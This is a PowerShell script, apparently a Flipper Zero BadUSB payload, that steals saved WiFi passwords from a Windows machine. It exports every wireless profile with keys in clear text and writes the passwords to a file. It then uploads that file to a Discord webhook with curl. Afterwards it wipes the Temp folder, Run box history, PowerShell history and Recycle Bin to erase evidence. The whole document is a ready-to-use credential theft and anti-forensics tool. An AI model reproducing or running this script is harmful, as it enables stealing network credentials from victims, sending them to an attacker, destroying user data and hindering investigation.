############################################################################################################################################################
# Title:          WiFi Grabber
# Author:         Rick (LordCodigo) Alvarez
# Description:    
#                 EN: Script for grabbing WiFi netoworks for Windows Machines
#                 ES: Script ladron de contraseñas de redes WiFi para machinas Windows
# Target:         Device: Flipper Zero / Target platform: Windows
############################################################################################################################################################

# MAKE LOOT FOLDER 
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_Wifi_Pass_Grabber.txt"

############################################################################################################################################################

cd $env:TMP
cmd /c "netsh wlan export profile key=clear"
Select-String -Path Wi*.xml -Pattern 'keyMaterial' >> $env:TMP\$FileName

############################################################################################################################################################

# Upload to Discord (Hook)
$WEBHOOK_URL = "<your_webhook_url_here>"
curl.exe -F "file1=@$env:TMP\$FileName" $WEBHOOK_URL

############################################################################################################################################################

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
